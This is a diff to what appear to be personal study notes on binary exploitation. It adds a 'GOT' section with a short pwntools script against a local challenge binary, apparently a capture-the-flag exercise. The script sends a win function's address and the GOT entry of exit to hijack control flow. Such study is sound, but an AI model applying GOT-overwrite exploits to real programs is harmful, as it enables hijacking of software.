@@ -36,3 +36,15 @@ Ex: `x/168x $sp' (4 byte chunks by default) $sp = stack pointer, $rip = instruct
 |    ret add    |
 +---------------+
 ```
+
+# GOT
+```python
+from pwn import *  # type: ignore
+
+context.binary = "./NeedsToBeHappy"
+e: ELF = context.binary  # type: ignore     #just to make the typechecker happy
+p = process()
+p.sendline(b"y")
+p.sendline(str(e.functions["give_the_man_a_cat"].address).encode("ascii"))
+p.sendline(str(e.got["exit"]).encode("ascii"))
+```
